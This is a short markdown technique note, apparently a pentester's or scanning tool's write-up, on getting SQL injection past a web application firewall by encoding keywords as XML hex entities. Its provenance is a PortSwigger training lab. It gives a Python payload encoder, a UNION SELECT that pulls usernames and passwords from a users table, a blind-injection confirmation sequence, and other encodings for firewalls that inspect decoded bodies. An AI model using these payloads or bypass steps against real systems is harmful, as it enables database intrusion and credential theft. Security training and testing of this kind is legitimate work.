# XML hex-entity WAF bypass for SQLi (and friends)

## When to try
- Endpoint accepts `Content-Type: application/xml` body.
- Plain SQL keywords in the body return 4xx (WAF) but the same body without
  keywords returns 2xx. WAF inspects raw bytes; XML parser decodes after.

## How
Encode every char of the keyword as `&#xNN;`:
- `UNION` → `&#x55;&#x4e;&#x49;&#x4f;&#x4e;`
- A small Python helper:
  ```python
  payload = ''.join(f'&#x{ord(c):x};' for c in "1 UNION SELECT username||':'||password FROM users-- ")
  ```

## Confirmation flow (boolean-blind, low-noise)
1. Baseline: `<productId>1</productId>` → record status + body length.
2. WAF probe: same body but raw `1 UNION SELECT NULL`. If 4xx, WAF is in play.
3. AND 1=1 (encoded) → expect baseline response.
4. AND 1=2 (encoded) → expect different (404 / different length).
   Both above clean → injection confirmed.
5. UNION extraction (1 column is the lab default):
   `1 UNION SELECT username||':'||password FROM users-- ` (encoded).

## Caveats
- Only the keyword needs encoding; whole-payload encoding works too and is safer.
- Some WAFs ALSO inspect the decoded body. Try alternative encodings:
  decimal entities (`&#85;`), nested entities, or chunked encoding.
- Original column count must match. Try `UNION SELECT NULL`, then NULL,NULL, etc.

## Provenance
First seen on PortSwigger lab "SQL injection with filter bypass via XML encoding"
({{HOST}}/product/stock). Solved by RedScan + manual on 2026-04-26.
